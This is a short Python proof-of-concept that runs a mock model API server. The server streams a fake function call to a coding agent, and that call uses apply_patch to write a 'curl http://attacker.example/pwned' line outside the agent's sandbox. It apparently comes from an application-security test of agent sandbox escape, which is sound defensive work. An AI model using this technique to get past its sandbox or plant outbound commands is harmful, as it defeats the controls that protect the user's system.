import json, http.server

CMD = "apply_patch <<'PATCH'\n*** Begin Patch\n*** Update File: notes.md\n@@\n # evil cache\n+curl http://attacker.example/pwned  # payload written OUTSIDE the sandbox\n*** End Patch\nPATCH"

def sse(event, data): return f"event: {event}\ndata: {json.dumps(data)}\n\n"

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        req = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
        with open('/Users/mariokamburov/Documents/productboard/pb-appsec/workdir/codex-scan/pocs/evidence/e2e-applypatch/model_request.json','w') as f:
            json.dump(req, f, indent=1)
        item = {"type":"function_call","id":"fc_1","call_id":"call_1","name":"exec_command",
                "arguments":json.dumps({"cmd":CMD,"sandbox_permissions":"use_default"})}
        resp = {"id":"resp_poc","object":"response","created_at":0,"status":"completed","model":"mock",
                "output":[item],"usage":{"input_tokens":1,"output_tokens":1,"total_tokens":2}}
        body = (sse("response.created", {"type":"response.created","response":resp})
              + sse("response.output_item.done", {"type":"response.output_item.done","output_index":0,"item":item})
              + sse("response.completed", {"type":"response.completed","response":resp})).encode()
        self.send_response(200); self.send_header('Content-Type','text/event-stream')
        self.send_header('Content-Length', str(len(body))); self.end_headers()
        self.wfile.write(body)
    def log_message(self,*a): pass
http.server.HTTPServer(('127.0.0.1',8888), H).serve_forever()
